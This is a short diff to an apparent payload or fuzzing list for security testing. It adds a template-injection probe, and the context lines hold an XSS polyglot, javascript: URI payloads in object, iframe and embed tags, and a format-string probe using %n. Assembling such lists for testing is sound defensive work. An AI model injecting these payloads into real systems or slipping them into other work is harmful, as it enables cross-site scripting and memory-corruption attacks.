@@ -679,3 +679,4 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 7*7
 "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n"
 <object data=javascript:alert(1)><iframe src=javascript:alert(1)><embed src=javascript:alert(1)>
+{{1+1}}><%1+1%>{1+1}<%= 1+1 %>
